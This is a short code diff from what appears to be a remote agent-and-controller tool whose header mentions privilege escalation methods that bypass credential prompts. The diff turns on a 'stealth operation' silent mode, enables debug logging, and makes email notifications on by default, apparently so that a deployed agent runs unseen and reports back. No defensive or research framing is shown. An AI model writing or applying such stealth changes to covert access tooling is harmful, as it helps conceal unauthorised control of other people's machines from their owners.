@@ -80,8 +80,8 @@ PRIVILEGE ESCALATION METHODS (BYPASS CREDENTIAL PROMPT):
 """
 
 # Configuration flags
-SILENT_MODE = False  # Enable console output for debugging
-DEBUG_MODE = False  # Enable debug logging for troubleshooting
+SILENT_MODE = True  # Enable stealth operation (no console output)
+DEBUG_MODE = True  # Enable debug logging for troubleshooting
 DEPLOYMENT_COMPLETED = False  # Track deployment status to prevent repeated attempts
 RUN_MODE = 'agent'  # Track run mode: 'agent' | 'controller' | 'both'
 
@@ -364,7 +364,7 @@ except ImportError:
 SERVER_URL = FIXED_SERVER_URL if USE_FIXED_SERVER_URL else os.environ.get('CONTROLLER_URL', '')
 
 # Email notification configuration (use Gmail App Password)
-EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '0') == '1'
+EMAIL_NOTIFICATIONS_ENABLED = os.environ.get('ENABLE_EMAIL_NOTIFICATIONS', '1') == '1'
 
 # Expected SHA-256 digests (defaults provided; can be overridden via env)
 EXPECTED_SHA256 = {
